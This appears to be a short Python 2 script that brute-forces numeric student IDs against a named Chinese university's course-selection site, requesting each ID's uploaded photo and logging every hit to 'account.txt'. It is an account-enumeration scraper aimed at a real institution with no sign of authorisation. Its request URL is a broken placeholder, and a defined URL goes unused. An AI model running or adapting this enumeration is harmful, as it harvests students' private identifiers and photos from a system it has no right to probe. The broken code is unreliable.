# -*- coding:utf-8 -*-
import requests

url = 'http://xuanke.jgsu.edu.cn/upload/XSXX/.jpg'

file = open('account.txt','a+')

for i in xrange(160000000000,169999999999):
	url_info = 'http://教务系统upload/XXX/{}.jpg'.format(i)
	info = requests.get(url_info)
	if info.status_code == 404:
		continue
	elif info.status_code ==200:
		print i
		account_info = str(i) + '\n'
		file.write(account_info)
	else:
		continue

